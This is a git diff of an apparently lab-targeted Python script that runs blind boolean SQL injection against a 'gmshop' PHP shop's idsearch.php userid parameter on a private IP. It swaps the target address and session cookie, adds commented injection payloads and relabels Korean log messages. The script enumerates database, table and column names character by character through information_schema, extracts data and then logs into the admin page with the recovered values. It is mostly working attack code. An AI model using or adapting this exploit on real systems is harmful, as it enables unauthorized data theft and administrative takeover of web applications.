@@ -2,9 +2,8 @@ from bs4 import BeautifulSoup
 import requests
 import re
 
-# http://192.168.81.129/gmshop/idsearch.php?userid=
-URL = 'http://192.168.81.129/gmshop/idsearch.php'
-cookies = {"PHPSESSID":"da519c2141b0a35c10d91abd16b4d2d0"}
+URL = 'http://192.168.200.129/gmshop/idsearch.php'
+cookies = {"PHPSESSID":"a796195aea1c9f9af451d66b66f75038"}
 
 
 
@@ -66,7 +65,7 @@ def get_database_name(length):
     return database_name
 
 
-
+# ' or 1=1 and length((select table_name from information_schema.tables where TABLE_TYPE='base table' and TABLE_SCHEMA='gmshop' limit 2,1))=5#
 # 테이블 길이 구하기
 def get_table_length(name):
     for a in range(20):
@@ -82,7 +81,7 @@ def get_table_length(name):
     print("[+] 테이블 길이 쿼리: " + get_data.get('userid'))
     return a
 
-            
+# ' or 1=1 and ascii(substring((select table_name from information_schema.tables where TABLE_TYPE='base table' and TABLE_SCHEMA='gmshop' limit 2,1),5,1))=110#            
 # 테이블 명 구하기 쿼리
 def get_table_name_query(length, db_name):
     # ' or 1=1 and ascii(substring((select table_name from information_schema.tables where TABLE_TYPE='base table' limit 0,1),1,1))<130#
@@ -104,7 +103,8 @@ def get_table_name_query(length, db_name):
     print("[+] 테이블 명 쿼리: " + get_data.get('userid'))
     return table_name
 
-# 데이터 길이 구하기
+
+# 컬럼 길이 구하기
 def get_col_length(name):
     for a in range(20):
         get_data1 = {'userid':'\' or 1=1 and length((select column_name \
@@ -112,7 +112,7 @@ def get_col_length(name):
         where table_name=\'{tb_name}\' limit 3,1))={length}#'.format(tb_name=name, length=a)}
         check1 = query_master(get_data1)
         if (len(check1) == 17):
-            print("[+] check1 데이터 길이 : %d"%a)
+            print("[+] check1 컬럼 길이 : %d"%a)
             break
 
     for b in range(20):
@@ -121,14 +121,14 @@ def get_col_length(name):
         where table_name=\'{tb_name}\' limit 4,1))={length}#'.format(tb_name=name, length=b)}
         check2 = query_master(get_data2)
         if (len(check2) == 17):
-            print("[+] check2 데이터 길이 : %d"%b)
+            print("[+] check2 컬럼 길이 : %d"%b)
             break
-    print("[+] 데이터 길이 쿼리: " + get_data1.get('userid'))
-    print("[+] 데이터 길이 쿼리: " + get_data2.get('userid'))
+    print("[+] 컬럼 길이 쿼리: " + get_data1.get('userid'))
+    print("[+] 컬럼 길이 쿼리: " + get_data2.get('userid'))
     return a, b
 
 
-# 데이터 문자 구하기
+# 컬럼 문자 구하기
 def get_col_name(name, data_num1, data_num2):
     data_str1 = ''
     data_str2 = ''
@@ -142,7 +142,7 @@ def get_col_name(name, data_num1, data_num2):
 
             if (len(data1) == 17):
                 data_str1+=chr(a)
-                print("[+] 데이터 문자열 : %s"%data_str1)
+                print("[+] 컬럼 문자열 : %s"%data_str1)
                 break
 
     for n in range(data_num2+1):
@@ -155,12 +155,12 @@ def get_col_name(name, data_num1, data_num2):
 
             if (len(data2) == 17):
                 data_str2+=chr(b)
-                print("[+] 데이터 문자열 : %s"%data_str2)
+                print("[+] 컬럼 문자열 : %s"%data_str2)
                 break
-    print("[+] 첫 번째 컬럼 데이터 : %s"%data_str1)
-    print("[+] 두 번째 컬럼 데이터 : %s"%data_str2)
-    print("[+] 데이터 문자열 쿼리 : " + get_data1.get('userid'))
-    print("[+] 데이터 문자열 쿼리 : " + get_data2.get('userid'))
+    print("[+] 첫 번째 컬럼 컬럼 : %s"%data_str1)
+    print("[+] 두 번째 컬럼 컬럼 : %s"%data_str2)
+    print("[+] 컬럼 문자열 쿼리 : " + get_data1.get('userid'))
+    print("[+] 컬럼 문자열 쿼리 : " + get_data2.get('userid'))
     return data_str1, data_str2
 
 # 데이터 길이
@@ -220,7 +220,7 @@ def get_get_data_name(name,col1, col2, num):
 # admin_login
 def admin_login(d1,d2,id, pw):
     print('[+] admin page 접속')
-    ADMINURL='http://192.168.81.129/gmshop/admin/'
+    ADMINURL='http://192.168.200.129/gmshop/admin/'
     res = requests.post(ADMINURL, data={d1:id, d2:pw}, cookies=cookies)    
     if res.status_code == 200:
         print('[+] admin page 접속 완료')  
